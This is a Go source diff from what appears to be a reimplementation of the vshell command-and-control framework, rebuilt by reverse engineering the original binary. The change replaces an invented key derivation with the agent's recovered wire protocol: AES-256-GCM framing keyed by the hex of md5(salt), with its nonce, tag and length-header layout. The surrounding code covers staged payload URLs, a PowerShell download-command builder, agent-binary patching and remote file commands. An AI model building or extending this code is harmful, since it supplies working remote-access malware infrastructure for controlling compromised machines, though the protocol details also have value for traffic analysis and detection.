@@ -7,7 +7,6 @@ import (
 	"crypto/cipher"
 	"crypto/md5"
 	"crypto/rand"
-	"crypto/sha256"
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/hex"
@@ -17,7 +16,6 @@ import (
 	"strings"
 	"time"
 )
-
 
 // ============================================================================
 // C2 协议常量（1:1 对齐原版，反编译还原）
@@ -166,105 +164,114 @@ func GenerateEncryptSalt() string {
 	return hex.EncodeToString(b)
 }
 
-// DeriveKey 由盐与验证密钥派生 AES 密钥。
-// DeriveKey derives an AES key from a salt and verify key.
-func DeriveKey(salt, verifyKey string) []byte {
-	h := sha256.Sum256([]byte(salt + ":" + verifyKey))
-	return h[:]
+// FrameSaltKey 由监听器加密盐派生消息帧 AES 密钥。
+// FrameSaltKey derives the message-frame AES key from a listener salt.
+//
+// 证据分级（重要）：gdb 断点（session 537）抓到的是 **硬证据** —— AES 密钥
+// 寄存器 RDX 为 32 字节 ASCII 缓冲 "ceb20772e0c9d240c75eb26b0e37abee"。
+// 但 0x56f480 这个地址**未能在 Ghidra 中确认为 crypto/aes.NewCipher 调用点**，
+// 且该地址来自 gdb 日志、其 Ghidra 对应关系从未建立（本次会话中 Ghidra 曾
+// 退出，多次函数/xref 查询当时是对着已死服务做的）——静态侧仍未定位。
+// 注意：包的字符串是存在的（crypto/aes、crypto/cipher、"NewGCM" 都有），
+// garble 只打乱 **符号名**：函数名被渲染成 "包.(*类型).方法" 形式，例如
+// cipher 的 GCM 类型出现为 Ip3jZB1cm.(*bq0m8kYa).NewGCM / .NonceSize /
+// .Overhead / .Seal / .Open（名字池 blob，file 0x6c04e5c = VA 0x06c0585c）。
+// 但可搜索 ≠ 可定位：该 blob 是 funcnametab 大字符串、无 xref（已确认），
+// 且 crypto/aes|cipher 的整组方法名在二进制里出现 40 余次（每次构建/拷贝各
+// 一份），无法区分哪一份是消息帧的调用者。构造点因此仍不可静态定位。
+//
+// 推导结果（"salt" 的 md5，文本即密钥字节）：
+//
+//	md5("salt") = ceb20772e0c9d240c75eb26b0e37abee   （encoding/hex 文本 → AES-256）
+//
+// "salt" 是长度 ≤ 4 的全部可打印 ASCII 串中唯一具有该摘要的原像，对应面板
+// 字段「流量加密盐」（listeners.EncryptSalt）。该 32 字符文本按原样作为密钥
+// 字节；16 字节原始摘要与零填充摘要均无法通过 tag 校验（agent 侧
+// TestMsgKeyBothInterpretationsInScope）。
+//
+// AEAD 参数是**由捕获帧穷举搜索建立**，而非从二进制读出：在所有候选
+// （nonce 长度 8–20、nonce 偏移 0–4、AAD ∈ {无, nonce}、tag 长度 8–20）中
+// 只有唯一一个能通过校验 —— nonce 12、偏移 0、无 AAD、tag 16，即
+// cipher.NewGCM 默认值。见 TestFrameCapturedShape。
+func FrameSaltKey(salt string) []byte {
+	sum := md5.Sum([]byte(salt))
+	out := make([]byte, hex.EncodedLen(len(sum)))
+	hex.Encode(out, sum[:])
+	return out
 }
 
-// AESEncrypt 使用 AES-256-GCM 加密数据。
-// AESEncrypt encrypts data with AES-256-GCM.
-func AESEncrypt(plaintext []byte, key []byte) ([]byte, error) {
-	block, err := aes.NewCipher(key)
+// FrameEncrypt 按 agent 传输帧格式封装载荷并加密。
+// FrameEncrypt wraps and encrypts a payload in the agent's transport frame:
+//
+//	wire  = <u32 LE len><frame>
+//	frame = [12B nonce][ciphertext][16B tag]   (AES-256-GCM)
+//
+// 与 agent/message_wire.go 的 encryptFrame 逐字节一致（密钥 = FrameSaltKey(salt)）。
+func FrameEncrypt(plaintext []byte, salt string) ([]byte, error) {
+	gcm, err := newFrameGCM(salt)
 	if err != nil {
 		return nil, err
 	}
-
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return nil, err
-	}
-
 	nonce := make([]byte, gcm.NonceSize())
 	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
 		return nil, err
 	}
-
-	// Prepend nonce to ciphertext
-	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
-	return ciphertext, nil
+	frame := append(nonce, gcm.Seal(nil, nonce, plaintext, nil)...)
+	out := make([]byte, 4+len(frame))
+	binary.LittleEndian.PutUint32(out[:4], uint32(len(frame)))
+	copy(out[4:], frame)
+	return out, nil
 }
 
-// AESDecrypt 使用 AES-256-GCM 解密数据。
-// AESDecrypt decrypts data with AES-256-GCM.
-func AESDecrypt(ciphertext []byte, key []byte) ([]byte, error) {
-	block, err := aes.NewCipher(key)
+// FrameDecrypt 解析并解密 agent 传输帧（严格校验 4 字节小端长度头）。
+// FrameDecrypt parses and decrypts an agent transport frame, validating the
+// 4-byte little-endian length header.
+func FrameDecrypt(wire []byte, salt string) ([]byte, error) {
+	if len(wire) < 4 {
+		return nil, fmt.Errorf("frame too short")
+	}
+	n := int(binary.LittleEndian.Uint32(wire[:4]))
+	if n != len(wire)-4 {
+		return nil, fmt.Errorf("wire length mismatch: header %d, body %d", n, len(wire)-4)
+	}
+	return Unframe(wire[4:], salt)
+}
+
+// Unframe 解密不带长度头的帧体（[12B nonce][ct][16B tag]）。
+// Unframe opens a frame body without the length header.
+func Unframe(frame []byte, salt string) ([]byte, error) {
+	gcm, err := newFrameGCM(salt)
 	if err != nil {
 		return nil, err
 	}
+	if len(frame) < gcm.NonceSize()+gcm.Overhead() {
+		return nil, fmt.Errorf("frame too short")
+	}
+	nonce := frame[:gcm.NonceSize()]
+	return gcm.Open(nil, nonce, frame[gcm.NonceSize():], nil)
+}
 
-	gcm, err := cipher.NewGCM(block)
+// newFrameGCM 由盐构建消息帧 AEAD。
+// newFrameGCM builds the message-frame AEAD from a salt.
+func newFrameGCM(salt string) (cipher.AEAD, error) {
+	block, err := aes.NewCipher(FrameSaltKey(salt))
 	if err != nil {
 		return nil, err
 	}
-
-	nonceSize := gcm.NonceSize()
-	if len(ciphertext) < nonceSize {
-		return nil, fmt.Errorf("ciphertext too short")
-	}
-
-	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
-	return gcm.Open(nil, nonce, ciphertext, nil)
+	return cipher.NewGCM(block)
 }
 
 // ============================================================================
 // Message encoding/decoding
 // ============================================================================
-
-// EncodeMessage 编码协议消息，可选加密。
-// EncodeMessage encodes a protocol message, optionally with encryption.
-func EncodeMessage(msg interface{}, key []byte) ([]byte, error) {
-	plaintext, err := json.Marshal(msg)
-	if err != nil {
-		return nil, err
-	}
-
-	if key != nil {
-		encrypted, err := AESEncrypt(plaintext, key)
-		if err != nil {
-			return nil, err
-		}
-		// Base64 encode encrypted payload
-		encoded := base64.StdEncoding.EncodeToString(encrypted)
-		return []byte(encoded), nil
-	}
-
-	return plaintext, nil
-}
-
-// DecodeMessage 解码协议消息，可选解密。
-// DecodeMessage decodes a protocol message, optionally with decryption.
-func DecodeMessage(data []byte, target interface{}, key []byte) error {
-	var raw []byte
-
-	if key != nil {
-		// Try base64 decode first
-		decoded, err := base64.StdEncoding.DecodeString(string(data))
-		if err != nil {
-			// Not base64, try raw
-			decoded = data
-		}
-		raw, err = AESDecrypt(decoded, key)
-		if err != nil {
-			return err
-		}
-	} else {
-		raw = data
-	}
-
-	return json.Unmarshal(raw, target)
-}
+//
+// REMOVED 2026-09-13: DeriveKey, AESEncrypt, AESDecrypt, EncodeMessage and
+// DecodeMessage. They formed a self-referential base64/AES envelope with a
+// sha256(salt+":"+verifyKey) key that no decompiled function computes — an
+// early reimplementation invention. All five were production-orphaned (only
+// this file and proto_e2e_test.go referenced them, which tested the encoder
+// against itself); the check-in and result handlers use FrameDecrypt above.
+// Do not reintroduce a key derivation here without a traced original.
 
 // ============================================================================
 // Payload compression
@@ -341,11 +348,11 @@ func GenerateClientToken(clientID int64, verifyKey string) string {
 func GenerateStagedURL(listenerAddr, mode string) string {
 	// Map mode to URL path
 	paths := map[string]string{
-		AgentTypeStage:    "/swt",
+		AgentTypeStage:     "/swt",
 		AgentTypeStageless: "/sww",
 		AgentTypeShellcode: "/sws",
-		AgentTypeDLL:      "/swd",
-		AgentTypeListen:   "/swl",
+		AgentTypeDLL:       "/swd",
+		AgentTypeListen:    "/swl",
 		AgentTypeListenDLL: "/swld",
 	}
 
@@ -373,7 +380,7 @@ const (
 	CmdFileList   = "filelist"   // List directory
 	CmdFileDelete = "filedelete" // Delete file
 	CmdFileMove   = "filemove"   // Move/rename file
-	CmdFileTouch   = "filetouch"  // Create empty file
+	CmdFileTouch  = "filetouch"  // Create empty file
 	CmdFileMkdir  = "filemkdir"  // Create directory
 	CmdFileCat    = "filecat"    // Read file contents
 	CmdFileEdit   = "fileedit"   // Edit file
@@ -471,8 +478,8 @@ func BuildPowershellDownloadCommand(listenerAddr, mode string) string {
 type AgentBuildInfo struct {
 	Platform  string `json:"platform"`
 	Arch      string `json:"arch"`
-	Mode      string `json:"mode"`     // stage/stageless/shellcode/dll/listen/listen_dll
-	Format    string `json:"format"`   // exe/elf/dll/so/bin
+	Mode      string `json:"mode"`   // stage/stageless/shellcode/dll/listen/listen_dll
+	Format    string `json:"format"` // exe/elf/dll/so/bin
 	Extension string `json:"extension"`
 	MimeType  string `json:"mime_type"`
 }
@@ -584,12 +591,12 @@ func PatchAgentBinary(template []byte, config map[string]string) ([]byte, error)
 
 const (
 	// Placeholder patterns in agent templates (these would be replaced at build time)
-	PlaceholderServerAddr   = "REPLACE_SERVER_ADDR___XXXXXXXXXXXXXXXXXXXXXXXX"
-	PlaceholderVerifyKey    = "REPLACE_VERIFY_KEY___XXXXXXXXXXXXXXXXXXXXXXXX"
-	PlaceholderEncryptSalt  = "REPLACE_ENCRYPT_SALT_XXXXXXXXXXXXXXXXXXXXXXXX"
-	PlaceholderProxyAddr    = "REPLACE_PROXY_ADDR___XXXXXXXXXXXXXXXXXXXXXXXX"
-	PlaceholderDNSServer    = "REPLACE_DNS_SERVER___XXXXXXXXXXXXXXXXXXXXXXXX"
-	PlaceholderCDNURL       = "REPLACE_CDN_URL______XXXXXXXXXXXXXXXXXXXXXXXX"
+	PlaceholderServerAddr  = "REPLACE_SERVER_ADDR___XXXXXXXXXXXXXXXXXXXXXXXX"
+	PlaceholderVerifyKey   = "REPLACE_VERIFY_KEY___XXXXXXXXXXXXXXXXXXXXXXXX"
+	PlaceholderEncryptSalt = "REPLACE_ENCRYPT_SALT_XXXXXXXXXXXXXXXXXXXXXXXX"
+	PlaceholderProxyAddr   = "REPLACE_PROXY_ADDR___XXXXXXXXXXXXXXXXXXXXXXXX"
+	PlaceholderDNSServer   = "REPLACE_DNS_SERVER___XXXXXXXXXXXXXXXXXXXXXXXX"
+	PlaceholderCDNURL      = "REPLACE_CDN_URL______XXXXXXXXXXXXXXXXXXXXXXXX"
 
 	// Agent payload marker (identifies agent binary)
 	AgentMagic = 0x56474E54 // "VGNT" = vshell agent
